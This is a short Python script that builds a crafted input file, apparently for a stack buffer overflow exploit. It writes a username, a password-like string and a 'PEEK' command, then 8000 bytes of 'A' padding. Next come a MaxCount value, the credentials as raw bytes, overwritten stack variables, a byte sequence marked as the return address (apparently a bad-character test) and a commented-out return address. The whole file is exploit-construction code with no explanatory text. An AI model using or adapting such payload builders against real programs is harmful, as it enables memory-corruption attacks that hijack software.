f = open("input.txt", "w")
f.write("""archer
VGPF24IDKK45SBP3
PEEK
""")
f.close()
f = open("input.txt", "ab")
f.write(bytes([0x41]*8000)) #var_2094
f.write(0x4b454550.to_bytes(4, "little")) #MaxCount
usnpwd = [int("0x" + t, 0) for t in "61 72 63 68 65 72 2f 56 47 50 46 32 34 49 44 4b 4b 34 35 53 42 50 33 00".split(" ")]
f.write(bytes(usnpwd)) # usnpwd
f.write(bytes([0x00]*(0x140 - len(usnpwd))))
vars_after = [int("0x" + t, 0) for t in "a4 20 00 00 00 00 00 00 04 00 00 00 00 90 21 00 28 ff 5f 00".split(" ")]
f.write(bytes(vars_after))
#ret addr
f.write(bytes(list(range(0,255))))
#f.write(0x62501C24.to_bytes(4, "little"))
f.close()
